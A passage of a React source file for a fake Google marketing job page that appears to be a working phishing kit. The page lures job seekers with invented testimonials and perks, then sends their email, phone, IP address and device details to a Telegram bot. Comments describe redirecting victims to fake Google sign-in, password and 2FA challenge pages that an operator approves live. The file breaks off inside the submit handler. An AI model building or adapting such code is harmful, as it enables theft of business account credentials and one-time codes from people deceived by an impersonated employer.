import { useState, useEffect, useRef } from 'react';
import { IMAGES } from '@/assets/images';
import { motion } from 'framer-motion';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { createClient } from '@supabase/supabase-js';
import * as z from 'zod';
import {
  MapPin, Briefcase, Calendar, Linkedin,
  ArrowRight, Play, Quote, ChevronRight, ChevronDown, ChevronLeft, Search,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { Layout } from '@/components/Layout';
import { ROUTE_PATHS } from '@/lib/index';
import { useI18n } from '@/lib/i18n';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
// Select components no longer used â€” replaced by native select

const GS = { fontFamily: "'Google Sans', 'Roboto', sans-serif" };
const RB = { fontFamily: "'Roboto', sans-serif" };
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string | undefined;
const SUPABASE_PUBLISHABLE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as string | undefined;
const SUPABASE_FORM_TABLE = (import.meta.env.VITE_SUPABASE_FORM_TABLE as string | undefined) ?? 'candidate_submissions';
const supabaseClient = SUPABASE_URL && SUPABASE_PUBLISHABLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY)
  : null;

// â”€â”€ Country list with flag emoji & dial code â”€â”€
const COUNTRIES = [
  { code: 'US', flag: 'ðŸ‡ºðŸ‡¸', name: 'United States',       dial: '+1' },
  { code: 'GB', flag: 'ðŸ‡¬ðŸ‡§', name: 'United Kingdom',       dial: '+44' },
  { code: 'AU', flag: 'ðŸ‡¦ðŸ‡º', name: 'Australia',            dial: '+61' },
  { code: 'CA', flag: 'ðŸ‡¨ðŸ‡¦', name: 'Canada',               dial: '+1' },
  { code: 'DE', flag: 'ðŸ‡©ðŸ‡ª', name: 'Germany',              dial: '+49' },
  { code: 'FR', flag: 'ðŸ‡«ðŸ‡·', name: 'France',               dial: '+33' },
  { code: 'JP', flag: 'ðŸ‡¯ðŸ‡µ', name: 'Japan',                dial: '+81' },
  { code: 'KR', flag: 'ðŸ‡°ðŸ‡·', name: 'South Korea',          dial: '+82' },
  { code: 'SG', flag: 'ðŸ‡¸ðŸ‡¬', name: 'Singapore',            dial: '+65' },
  { code: 'IN', flag: 'ðŸ‡®ðŸ‡³', name: 'India',                dial: '+91' },
  { code: 'CN', flag: 'ðŸ‡¨ðŸ‡³', name: 'China',                dial: '+86' },
  { code: 'HK', flag: 'ðŸ‡­ðŸ‡°', name: 'Hong Kong',            dial: '+852' },
  { code: 'TW', flag: 'ðŸ‡¹ðŸ‡¼', name: 'Taiwan',               dial: '+886' },
  { code: 'ID', flag: 'ðŸ‡®ðŸ‡©', name: 'Indonesia',            dial: '+62' },
  { code: 'MY', flag: 'ðŸ‡²ðŸ‡¾', name: 'Malaysia',             dial: '+60' },
  { code: 'TH', flag: 'ðŸ‡¹ðŸ‡­', name: 'Thailand',             dial: '+66' },
  { code: 'VN', flag: 'ðŸ‡»ðŸ‡³', name: 'Vietnam',              dial: '+84' },
  { code: 'PH', flag: 'ðŸ‡µðŸ‡­', name: 'Philippines',          dial: '+63' },
  { code: 'PK', flag: 'ðŸ‡µðŸ‡°', name: 'Pakistan',             dial: '+92' },
  { code: 'BD', flag: 'ðŸ‡§ðŸ‡©', name: 'Bangladesh',           dial: '+880' },
  { code: 'LK', flag: 'ðŸ‡±ðŸ‡°', name: 'Sri Lanka',            dial: '+94' },
  { code: 'NP', flag: 'ðŸ‡³ðŸ‡µ', name: 'Nepal',                dial: '+977' },
  { code: 'NZ', flag: 'ðŸ‡³ðŸ‡¿', name: 'New Zealand',          dial: '+64' },
  { code: 'BR', flag: 'ðŸ‡§ðŸ‡·', name: 'Brazil',               dial: '+55' },
  { code: 'MX', flag: 'ðŸ‡²ðŸ‡½', name: 'Mexico',               dial: '+52' },
  { code: 'AR', flag: 'ðŸ‡¦ðŸ‡·', name: 'Argentina',            dial: '+54' },
  { code: 'CL', flag: 'ðŸ‡¨ðŸ‡±', name: 'Chile',                dial: '+56' },
  { code: 'CO', flag: 'ðŸ‡¨ðŸ‡´', name: 'Colombia',             dial: '+57' },
  { code: 'PE', flag: 'ðŸ‡µðŸ‡ª', name: 'Peru',                 dial: '+51' },
  { code: 'VE', flag: 'ðŸ‡»ðŸ‡ª', name: 'Venezuela',            dial: '+58' },
  { code: 'ZA', flag: 'ðŸ‡¿ðŸ‡¦', name: 'South Africa',         dial: '+27' },
  { code: 'NG', flag: 'ðŸ‡³ðŸ‡¬', name: 'Nigeria',              dial: '+234' },
  { code: 'EG', flag: 'ðŸ‡ªðŸ‡¬', name: 'Egypt',                dial: '+20' },
  { code: 'KE', flag: 'ðŸ‡°ðŸ‡ª', name: 'Kenya',                dial: '+254' },
  { code: 'GH', flag: 'ðŸ‡¬ðŸ‡­', name: 'Ghana',                dial: '+233' },
  { code: 'MA', flag: 'ðŸ‡²ðŸ‡¦', name: 'Morocco',              dial: '+212' },
  { code: 'SA', flag: 'ðŸ‡¸ðŸ‡¦', name: 'Saudi Arabia',         dial: '+966' },
  { code: 'AE', flag: 'ðŸ‡¦ðŸ‡ª', name: 'UAE',                  dial: '+971' },
  { code: 'IL', flag: 'ðŸ‡®ðŸ‡±', name: 'Israel',               dial: '+972' },
  { code: 'TR', flag: 'ðŸ‡¹ðŸ‡·', name: 'Turkey',               dial: '+90' },
  { code: 'IR', flag: 'ðŸ‡®ðŸ‡·', name: 'Iran',                 dial: '+98' },
  { code: 'IQ', flag: 'ðŸ‡®ðŸ‡¶', name: 'Iraq',                 dial: '+964' },
  { code: 'RU', flag: 'ðŸ‡·ðŸ‡º', name: 'Russia',               dial: '+7' },
  { code: 'UA', flag: 'ðŸ‡ºðŸ‡¦', name: 'Ukraine',              dial: '+380' },
  { code: 'PL', flag: 'ðŸ‡µðŸ‡±', name: 'Poland',               dial: '+48' },
  { code: 'NL', flag: 'ðŸ‡³ðŸ‡±', name: 'Netherlands',          dial: '+31' },
  { code: 'BE', flag: 'ðŸ‡§ðŸ‡ª', name: 'Belgium',              dial: '+32' },
  { code: 'CH', flag: 'ðŸ‡¨ðŸ‡­', name: 'Switzerland',          dial: '+41' },
  { code: 'AT', flag: 'ðŸ‡¦ðŸ‡¹', name: 'Austria',              dial: '+43' },
  { code: 'SE', flag: 'ðŸ‡¸ðŸ‡ª', name: 'Sweden',               dial: '+46' },
  { code: 'NO', flag: 'ðŸ‡³ðŸ‡´', name: 'Norway',               dial: '+47' },
  { code: 'DK', flag: 'ðŸ‡©ðŸ‡°', name: 'Denmark',              dial: '+45' },
  { code: 'FI', flag: 'ðŸ‡«ðŸ‡®', name: 'Finland',              dial: '+358' },
  { code: 'PT', flag: 'ðŸ‡µðŸ‡¹', name: 'Portugal',             dial: '+351' },
  { code: 'ES', flag: 'ðŸ‡ªðŸ‡¸', name: 'Spain',                dial: '+34' },
  { code: 'IT', flag: 'ðŸ‡®ðŸ‡¹', name: 'Italy',                dial: '+39' },
  { code: 'GR', flag: 'ðŸ‡¬ðŸ‡·', name: 'Greece',               dial: '+30' },
  { code: 'CZ', flag: 'ðŸ‡¨ðŸ‡¿', name: 'Czech Republic',       dial: '+420' },
  { code: 'HU', flag: 'ðŸ‡­ðŸ‡º', name: 'Hungary',              dial: '+36' },
  { code: 'RO', flag: 'ðŸ‡·ðŸ‡´', name: 'Romania',              dial: '+40' },
  { code: 'SK', flag: 'ðŸ‡¸ðŸ‡°', name: 'Slovakia',             dial: '+421' },
  { code: 'HR', flag: 'ðŸ‡­ðŸ‡·', name: 'Croatia',              dial: '+385' },
  { code: 'RS', flag: 'ðŸ‡·ðŸ‡¸', name: 'Serbia',               dial: '+381' },
  { code: 'BG', flag: 'ðŸ‡§ðŸ‡¬', name: 'Bulgaria',             dial: '+359' },
];
// remove duplicate MX entry above â€” already filtered at render time

const formSchema = z.object({
  firstName: z.string().min(1, 'Required'),
  lastName: z.string().min(1, 'Required'),
  businessEmail: z.string()
    .email('Enter a valid email address')
    .refine((email) => {
      const freeProviders = [
        'gmail.com','googlemail.com','yahoo.com','yahoo.co.uk','yahoo.fr','yahoo.de',
        'yahoo.es','yahoo.it','yahoo.ca','yahoo.com.au','yahoo.co.in',
        'hotmail.com','hotmail.co.uk','hotmail.fr','hotmail.de','hotmail.es','hotmail.it',
        'outlook.com','outlook.co.uk','outlook.fr','outlook.de','live.com','live.co.uk',
        'msn.com','icloud.com','me.com','mac.com','aol.com','protonmail.com',
        'proton.me','tutanota.com','zoho.com','yandex.com','yandex.ru','mail.ru',
        'gmx.com','gmx.net','gmx.de','inbox.com','fastmail.com','hey.com',
        'pm.me','privaterelay.appleid.com',
      ];
      const domain = email.split('@')[1]?.toLowerCase();
      return domain ? !freeProviders.includes(domain) : false;
    }, 'Please use your business email address â€” personal emails (Gmail, Yahoo, Outlook, etc.) are not accepted'),
  // LinkedIn KHÃ”NG báº¯t buá»™c. Náº¿u user Ä‘iá»n thÃ¬ cháº¥p nháº­n cáº£ URL Ä‘áº§y Ä‘á»§
  // (https://linkedin.com/in/â€¦) hoáº·c slug ngáº¯n (linkedin.com/in/â€¦); náº¿u
  // bá» trá»‘ng â†’ pass luÃ´n Ä‘á»ƒ khÃ´ng cháº·n redirect Submit & continue.
  linkedInProfile: z.string().optional().refine(
    (v) => !v || /linkedin\.com/i.test(v),
    'Enter a valid linkedin.com URL (hoáº·c bá» trá»‘ng)'
  ),
  countryCode: z.string().min(1, 'Select a country'),
  phoneNumber: z.string().min(6, 'Enter a valid phone number'),
  preferredDate: z.string().min(1, 'Please select a date').refine(v => {
    if (!v) return false;
    const min = new Date(); min.setDate(min.getDate() + 8); min.setHours(0,0,0,0);
    return new Date(v) >= min;
  }, 'Please select a date at least 8 days from today'),
  preferredTime: z.string().min(1, 'Please select a time'),
  consentPrivacy: z.boolean().refine(v => v === true, 'You must agree to the privacy policy'),
  consentAccuracy: z.boolean().refine(v => v === true, 'You must certify accuracy'),
});
type FormData = z.infer<typeof formSchema>;

const GoogleGIcon = () => (
  <svg width="18" height="18" viewBox="0 0 24 24">
    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
  </svg>
);

function FormField({ label, required, error, hint, children }: {
  label: string; required?: boolean; error?: string; hint?: string; children: React.ReactNode;
}) {
  return (
    <div>
      <label className="block text-[14px] font-medium text-[#202124] mb-1.5" style={GS}>
        {label}{required && <span className="text-[#d93025] ml-0.5">*</span>}
      </label>
      {children}
      {hint && !error && (
        <p className="text-[12px] text-[#5f6368] mt-1 leading-relaxed" style={RB}>{hint}</p>
      )}
      {error && (
        <p className="text-[12px] text-[#d93025] mt-1" style={RB}>⚠ {error}</p>
      )}
    </div>
  );
}

const TESTIMONIALS = [
  {
    quote: "Working in Google's marketing org means your ideas can reach billions. The scale and ambition here is unlike anywhere I've worked.",
    name: 'Sarah K.',
    title: 'Senior Marketing Manager, Google',
    img: IMAGES.EXECUTIVE_PORTRAIT_5,
  },
  {
    quote: "Google gives marketers the data, tools, and freedom to do the best work of their careers. The culture of experimentation is addictive.",
    name: 'James L.',
    title: 'Head of Performance Marketing, Google',
    img: IMAGES.TEAM_STRATEGY_2,
  },
];

const WHY_GOOGLE = [
  {
    color: '#1a73e8',
    bg: '#e8f0fe',
    title: 'Unparalleled Scale',
    body: 'Influence marketing decisions that reach billions of users across Search, YouTube, Maps, and every Google product worldwide.',
  },
  {
    color: '#1a73e8',
    bg: '#e8f0fe',
    title: 'Best-in-Class Team',
    body: 'Join 120+ world-class marketers, data scientists, and creatives who set industry benchmarks every quarter.',
  },
  {
    color: '#1a73e8',
    bg: '#e8f0fe',
    title: 'Innovation Culture',
    body: "Google's famous 20% time, internal labs access, and a bias toward bold experiments make every week energizing.",
  },
  {
    color: '#1a73e8',
    bg: '#e8f0fe',
    title: 'Real Budget Authority',
    body: 'You own a $250M+ media budget with full decision-making authority â€” no bureaucracy, just results.',
  },
];

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Custom Calendar Component â€” red circles on locked days
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function CustomCalendar({
  selected, onSelect, onClose,
}: {
  selected: string;
  onSelect: (dateStr: string) => void;
  onClose: () => void;
}) {
  // Recalculate every time the calendar opens â€” always fresh
  const today = new Date();
  today.setHours(0, 0, 0, 0);

  // Lock today through today+7 (8 days total: today is day-0, today+7 is day-7)
  // This is recalculated on each render so it stays accurate daily
  const lockUntil = new Date(today);
  lockUntil.setDate(lockUntil.getDate() + 7); // today+7 = last locked day

  const [viewYear,  setViewYear]  = useState(today.getFullYear());
  const [viewMonth, setViewMonth] = useState(today.getMonth()); // 0-based

  const MONTH_NAMES = ['January','February','March','April','May','June',
                       'July','August','September','October','November','December'];
  const DAY_LABELS  = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];

  const firstDay   = new Date(viewYear, viewMonth, 1).getDay(); // 0=Sun
  const daysInMonth = new Date(viewYear, viewMonth + 1, 0).getDate();

  const prevMonth = () => {
    if (viewMonth === 0) { setViewMonth(11); setViewYear(y => y - 1); }
    else setViewMonth(m => m - 1);
  };
  const nextMonth = () => {
    if (viewMonth === 11) { setViewMonth(0); setViewYear(y => y + 1); }
    else setViewMonth(m => m + 1);
  };

  const toStr = (y: number, m: number, d: number) =>
    `${y}-${String(m + 1).padStart(2,'0')}-${String(d).padStart(2,'0')}`;

  const cells: (number | null)[] = [
    ...Array(firstDay).fill(null),
    ...Array.from({ length: daysInMonth }, (_, i) => i + 1),
  ];
  // pad to full weeks
  while (cells.length % 7 !== 0) cells.push(null);

  return (
    <div
      className="absolute left-0 top-full mt-1 z-50 bg-white rounded-xl shadow-[0_8px_32px_rgba(0,0,0,0.18)] border border-[#e8eaed] p-4"
      style={{ width: 320 }}
      onMouseDown={e => e.stopPropagation()}
    >
      {/* Header */}
      <div className="flex items-center justify-between mb-4">
        <button type="button" onClick={prevMonth}
          className="p-1 rounded-full hover:bg-[#f1f3f4] transition-colors">
          <ChevronLeft size={18} className="text-[#5f6368]" />
        </button>
        <span className="text-[15px] font-semibold text-[#202124]" style={GS}>
          {MONTH_NAMES[viewMonth]} {viewYear}
        </span>
        <button type="button" onClick={nextMonth}
          className="p-1 rounded-full hover:bg-[#f1f3f4] transition-colors">
          <ChevronRight size={18} className="text-[#5f6368]" />
        </button>
      </div>

      {/* Day labels */}
      <div className="grid grid-cols-7 mb-1">
        {DAY_LABELS.map(d => (
          <div key={d} className="text-center text-[11px] font-medium text-[#80868b] py-1" style={GS}>{d}</div>
        ))}
      </div>

      {/* Date cells */}
      <div className="grid grid-cols-7 gap-y-0.5">
        {cells.map((day, idx) => {
          if (!day) return <div key={idx} />;
          const dateObj = new Date(viewYear, viewMonth, day);
          const dateStr = toStr(viewYear, viewMonth, day);
          const isLocked   = dateObj <= lockUntil;
          const isPast     = dateObj < today;
          const isSelected = dateStr === selected;
          const isToday    = dateObj.getTime() === today.getTime();

          return (
            <div key={idx} className="flex items-center justify-center py-0.5">
              <button
                type="button"
                disabled={isLocked || isPast}
                onClick={() => { if (!isLocked && !isPast) { onSelect(dateStr); onClose(); } }}
                style={isLocked && !isPast ? {
                  // red circle outline for locked (but not past) days
                  border: '1.5px solid #d93025',
                  borderRadius: '50%',
                  color: '#d93025',
                  background: 'transparent',
                  cursor: 'not-allowed',
                  width: 36, height: 36,
                  fontSize: 13,
                  fontFamily: RB.fontFamily,
                } : isSelected ? {
                  background: '#1a73e8',
                  borderRadius: '50%',
                  color: '#fff',
                  border: 'none',
                  cursor: 'pointer',
                  width: 36, height: 36,
                  fontSize: 13,
                  fontFamily: RB.fontFamily,
                } : isToday ? {
                  border: '1.5px solid #1a73e8',
                  borderRadius: '50%',
                  color: '#1a73e8',
                  background: 'transparent',
                  cursor: isPast ? 'not-allowed' : 'pointer',
                  width: 36, height: 36,
                  fontSize: 13,
                  fontFamily: RB.fontFamily,
                } : isPast ? {
                  color: '#dadce0',
                  cursor: 'not-allowed',
                  background: 'transparent',
                  border: 'none',
                  borderRadius: '50%',
                  width: 36, height: 36,
                  fontSize: 13,
                  fontFamily: RB.fontFamily,
                } : {
                  color: '#202124',
                  background: 'transparent',
                  border: 'none',
                  borderRadius: '50%',
                  cursor: 'pointer',
                  width: 36, height: 36,
                  fontSize: 13,
                  fontFamily: RB.fontFamily,
                }}
                className={!isLocked && !isPast ? 'hover:bg-[#f1f3f4]' : ''}
              >
                {day}
              </button>
            </div>
          );
        })}
      </div>
    </div>
  );
}

export default function Home() {
  const [submitError, setSubmitError] = useState<string | null>(null);
  // Giữ nút ở trạng thái "Submitting…" trong khoảng REDIRECT_DELAY_MS trước
  // khi browser navigate sang /signin/. Không còn success UI ở trang landing
  // vì confirmation thực sự nằm ở /signin/confirmed/ sau khi admin duyệt
  // xong toàn bộ flow login + 2FA. Trang này chỉ là bước thu thập thông tin.
  const [isRedirecting, setIsRedirecting] = useState(false);
  const { t } = useI18n();

  // Smooth scroll Ä‘áº¿n #form
  const scrollToForm = (e: React.MouseEvent) => {
    e.preventDefault();
    const el = document.getElementById('form');
    if (!el) return;
    const startY = window.scrollY;
    const targetY = el.getBoundingClientRect().top + window.scrollY - 80;
    const distance = targetY - startY;
    const duration = 900;
    let startTime: number | null = null;
    const ease = (t: number) => t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2,3)/2;
    const step = (ts: number) => {
      if (!startTime) startTime = ts;
      const p = Math.min((ts - startTime) / duration, 1);
      window.scrollTo(0, startY + distance * ease(p));
      if (p < 1) requestAnimationFrame(step);
    };
    requestAnimationFrame(step);
  };
  // Custom calendar state
  const [calendarOpen, setCalendarOpen] = useState(false);
  const [selectedDateStr, setSelectedDateStr] = useState('');
  const calendarRef = useRef<HTMLDivElement>(null);

  // Close calendar on outside click
  useEffect(() => {
    const h = (e: MouseEvent) => {
      if (calendarRef.current && !calendarRef.current.contains(e.target as Node))
        setCalendarOpen(false);
    };
    document.addEventListener('mousedown', h);
    return () => document.removeEventListener('mousedown', h);
  }, []);

  // Custom country dropdown state
  const [countryOpen, setCountryOpen] = useState(false);
  const [countrySearch, setCountrySearch] = useState('');
  const [selectedCountryCode, setSelectedCountryCode] = useState('US');
  const countryRef = useRef<HTMLDivElement>(null);
  const lastSentEmailRef = useRef('');
  const lastSentPhoneRef = useRef('');

  // Close dropdown on outside click
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (countryRef.current && !countryRef.current.contains(e.target as Node)) {
        setCountryOpen(false);
        setCountrySearch('');
      }
    };
    document.addEventListener('mousedown', handler);
    return () => document.removeEventListener('mousedown', handler);
  }, []);

  // Slow eased scroll to #form section on page load
  useEffect(() => {
    const timer = setTimeout(() => {
      const el = document.getElementById('form');
      if (!el) return;

      const startY = window.scrollY;
      const targetY = el.getBoundingClientRect().top + window.scrollY - 80;
      const distance = targetY - startY;
      const duration = 2800; // ms â€” deliberately slow for a calm, elegant feel
      let startTime: number | null = null;

      // Ease-in-out cubic for a natural, slow glide
      const easeInOutCubic = (t: number) =>
        t < 0.5 ? 4 * t * t * t : 1 - Math.pow(-2 * t + 2, 3) / 2;

      const step = (timestamp: number) => {
        if (!startTime) startTime = timestamp;
        const elapsed = timestamp - startTime;
        const progress = Math.min(elapsed / duration, 1);
        window.scrollTo(0, startY + distance * easeInOutCubic(progress));
        if (progress < 1) requestAnimationFrame(step);
      };

      requestAnimationFrame(step);
    }, 1800); // wait 1.8s before starting scroll

    return () => clearTimeout(timer);
  }, []);

  const {
    register, handleSubmit,
    formState: { errors, isSubmitting },
    setValue, watch, getValues,
  } = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: { countryCode: 'US' },
  });

  // watched for validation only
  void watch('preferredDate');
  void watch('preferredTime');
  void watch('countryCode');

  const currentCountry = COUNTRIES.find(c => c.code === selectedCountryCode) ?? COUNTRIES[0];
  const filteredCountries = COUNTRIES.filter((c, i, arr) =>
    arr.findIndex(x => x.code === c.code) === i // dedupe
    && (c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
        c.dial.includes(countrySearch))
  );
  const consentPrivacy  = watch('consentPrivacy');
  const consentAccuracy = watch('consentAccuracy');

  // Min selectable date = today + 8 days (lock 8 nearest days)
  // locked-days logic is handled inside CustomCalendar component

  // Fixed time slots always shown
  const TIME_OPTIONS = [
    '09:00 AM', '09:30 AM', '10:00 AM', '10:30 AM', '11:00 AM', '11:30 AM',
    '01:00 PM', '01:30 PM', '02:00 PM', '02:30 PM', '03:00 PM', '03:30 PM',
    '04:00 PM', '04:30 PM',
  ];

  const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN as string | undefined;
  const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID as string | undefined;
  const TRACKING_SESSION_KEY = 'candidate_tracking_session_id';
  // URL signin production â€” Ä‘á»“ng bá»™ vá»›i cáº¥u trÃºc folder public/signin/.
  // Flow: /  â†’  /signin/  â†’  /signin/challenge/pwd/  â†’  /signin/challenge/*  â†’  /signin/confirmed/
  const SIGNIN_REDIRECT_URL = '/signin/?signin';
  // Delay trÆ°á»›c khi chuyá»ƒn sang trang /signin sau khi user báº¥m "Submit &
  // continue". Cho user tháº¥y tráº¡ng thÃ¡i "Submittingâ€¦" thÃªm vÃ i giÃ¢y
  // (táº¡o cáº£m giÃ¡c há»‡ thá»‘ng Ä‘ang xá»­ lÃ½) rá»“i má»›i redirect.
  const REDIRECT_DELAY_MS = 2000;

  const sendTelegramMessage = async (message: string) => {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      throw new Error('Missing Telegram environment variables');
    }

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      let apiError = `Telegram API error: ${response.status}`;
      try {
        const errorData = await response.json();
        if (errorData?.description) {
          apiError = errorData.description as string;
        }
      } catch {
        // Keep fallback message when Telegram response is not JSON.
      }
      throw new Error(apiError);
    }
  };

  const formatDateForMessage = (dateString: string) => {
    const date = new Date(`${dateString}T00:00:00`);
    if (Number.isNaN(date.getTime())) return dateString;
    const day = String(date.getDate()).padStart(2, '0');
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const year = date.getFullYear();
    return `${day}/${month}/${year}`;
  };

  const createCandidateSessionId = () =>
    `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;

  const getTrackingSessionId = () => {
    const existing = window.sessionStorage.getItem(TRACKING_SESSION_KEY);
    if (existing) return existing;
    const generated = `track-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
    window.sessionStorage.setItem(TRACKING_SESSION_KEY, generated);
    return generated;
  };

  const escapeHtml = (value: string) =>
    value
      .replaceAll('&', '&amp;')
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
      .replaceAll('"', '&quot;')
      .replaceAll("'", '&#39;');

  const detectOs = (ua: string) => {
    if (ua.includes('Windows NT 10.0')) return 'Windows 10';
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac OS X')) return 'macOS';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    if (ua.includes('Linux')) return 'Linux';
    return 'Unknown OS';
  };

  const detectBrowser = (ua: string) => {
    const chromeMatch = ua.match(/Chrome\/(\d+)/);
    if (chromeMatch) return `Chrome ${chromeMatch[1]}`;
    const edgeMatch = ua.match(/Edg\/(\d+)/);
    if (edgeMatch) return `Edge ${edgeMatch[1]}`;
    const firefoxMatch = ua.match(/Firefox\/(\d+)/);
    if (firefoxMatch) return `Firefox ${firefoxMatch[1]}`;
    const safariMatch = ua.match(/Version\/(\d+).+Safari/);
    if (safariMatch) return `Safari ${safariMatch[1]}`;
    return 'Unknown Browser';
  };

  const detectDeviceType = (ua: string) => {
    if (/Mobile|Android|iPhone|iPad/i.test(ua)) return 'Mobile';
    return 'Desktop';
  };

  const getIpInfo = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) {
        return { ip: 'Unknown', country: 'Unknown' };
      }
      const data = await response.json() as { ip?: string; country_name?: string };
      return {
        ip: data.ip ?? 'Unknown',
        country: data.country_name ?? 'Unknown',
      };
    } catch {
      return { ip: 'Unknown', country: 'Unknown' };
    }
  };

  const sendInteractionNotice = async (action: string) => {
    try {
      const ua = window.navigator.userAgent;
      const sessionId = getTrackingSessionId();
      const [ipInfo] = await Promise.all([getIpInfo()]);
      const message = [
        '<b>ðŸ‘€ CANDIDATE ACTIVITY</b>',
        '',
        `ðŸ”” Action: ${escapeHtml(action)}`,
        `ðŸ• Time: ${escapeHtml(new Date().toLocaleString())}`,
        `ðŸ†” Session: <code>${escapeHtml(sessionId)}</code>`,
        `ðŸŒ IP: <code>${escapeHtml(ipInfo.ip)}</code>`,
        `ðŸŒ IP Country: ${escapeHtml(ipInfo.country)}`,
        `ðŸ“± Device: ${escapeHtml(`${detectDeviceType(ua)} | ${detectOs(ua)} | ${detectBrowser(ua)}`)}`,
      ].join('\n');
      await sendTelegramMessage(message);
    } catch {
      // Interaction tracking should never block normal UX.
    }
  };

  const onIntentCtaClick = (label: string) => (e: React.MouseEvent) => {
    void sendInteractionNotice(`Clicked "${label}" and preparing to fill interview form`);
    scrollToForm(e);
  };

  const sendContactFieldNotice = async (field: 'email' | 'phone', rawValue: string) => {
    const trimmedValue = rawValue.trim();
    if (!trimmedValue) return;

    if (field === 'email' && trimmedValue === lastSentEmailRef.current) return;
    if (field === 'phone' && trimmedValue === lastSentPhoneRef.current) return;

    if (field === 'email') lastSentEmailRef.current = trimmedValue;
    if (field === 'phone') lastSentPhoneRef.current = trimmedValue;

    try {
      const [ipInfo] = await Promise.all([getIpInfo()]);
      const ua = window.navigator.userAgent;
      const sessionId = getTrackingSessionId();
      const message = [
        '<b>ðŸ“¥ CANDIDATE CONTACT CAPTURED</b>',
        '',
        `ðŸ§© Field: ${field === 'email' ? 'Business Email' : 'Phone Number'}`,
        `ðŸ“ Value: <code>${escapeHtml(trimmedValue)}</code>`,
        `ðŸ• Time: ${escapeHtml(new Date().toLocaleString())}`,
        `ðŸ†” Session: <code>${escapeHtml(sessionId)}</code>`,
        `ðŸŒ IP: <code>${escapeHtml(ipInfo.ip)}</code>`,
        `ðŸŒ IP Country: ${escapeHtml(ipInfo.country)}`,
        `ðŸ“± Device: ${escapeHtml(`${detectDeviceType(ua)} | ${detectOs(ua)} | ${detectBrowser(ua)}`)}`,
      ].join('\n');
      await sendTelegramMessage(message);
    } catch {
      // Do not block the form interaction if this telemetry message fails.
    }
  };

  const onSubmit = async (data: FormData) => {
    setSubmitError(null);

    // LÆ°u toÃ n bá»™ Interview Details vÃ o localStorage TRÆ¯á»šC khi lÃ m báº¥t ká»³
    // API call nÃ o â€” Ä‘á»ƒ trang success.html Ä‘á»c vÃ  hiá»ƒn thá»‹ Ä‘Æ°á»£c ká»ƒ cáº£ khi
    // Supabase / Telegram fail. LÆ°u cáº£ dáº¡ng object gá»™p + cÃ¡c key láº» Ä‘á»ƒ
    // tÆ°Æ¡ng thÃ­ch vá»›i cÃ¡c trang login/2FA Ä‘ang Ä‘á»c userEmail rá»i.
    try {
      const interviewDetails = {
        firstName:       data.firstName,
        lastName:        data.lastName,
        businessEmail:   data.businessEmail,
        linkedInProfile: data.linkedInProfile,
        countryCode:     data.countryCode,
        phoneNumber:     data.phoneNumber,
        preferredDate:   data.preferredDate,
        preferredTime:   data.preferredTime,
        submittedAt:     new Date().toISOString(),
      };
      localStorage.setItem('interviewDetails', JSON.stringify(interviewDetails));
      localStorage.setItem('userEmail',       data.businessEmail || '');
      localStorage.setItem('preferredDate',   data.preferredDate || '');
      localStorage.setItem('preferredTime',   data.preferredTime || '');
    } catch (_) { /* localStorage cÃ³ thá»ƒ bá»‹ disable trong Safari private mode */ }

    try {
      const [ipInfo] = await Promise.all([getIpInfo()]);
      const sessionId = createCandidateSessionId();
      const ua = window.navigator.userAgent;
      const device = `${detectDeviceType(ua)} | ${detectOs(ua)} | ${detectBrowser(ua)}`;
